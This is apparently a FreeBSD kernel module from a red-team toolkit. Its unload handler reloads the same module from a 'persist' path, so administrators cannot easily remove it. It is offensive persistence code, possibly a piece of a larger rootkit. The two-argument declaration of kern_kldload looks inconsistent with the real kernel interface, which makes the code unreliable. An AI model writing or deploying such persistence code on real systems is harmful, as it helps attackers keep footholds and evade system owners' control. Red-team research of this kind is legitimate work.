#include <sys/param.h>
#include <sys/module.h>
#include <sys/kernel.h>
#include <sys/socketvar.h>
#include <sys/protosw.h>
#include <sys/systm.h>
#include <sys/types.h>
#include <sys/mbuf.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <sys/proc.h>
#include <sys/sysent.h>
#include <sys/sysproto.h>
#include <sys/exec.h>
#include <net/pfil.h>
#include <netinet/ip_var.h>
#include <net/if.h>
#include <sys/syslog.h>
#include <sys/eventhandler.h>


extern int kern_kldload(struct thread *td, const char *filename);

static void reload(void) {
    struct thread *td = curthread;  // Get current thread
    int error = kern_kldload(td, "/Red-Team-Tool-Collab/persist/kms.ko");
    if (error == 0) {return;}
}

static int event_handler(struct module *module, int event, void *arg) {
    switch (event) {
        case MOD_LOAD:
        printf("[LKM] Module loaded.\n");
            return 0;
        case MOD_UNLOAD:
            printf("[LKM] Module unloaded.\n");
            reload();
            return 0;
        default:
            return EOPNOTSUPP;
    }
}

static moduledata_t module_data = {
    "kms",
    event_handler,
    NULL
};

DECLARE_MODULE(kms_lkm, module_data, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
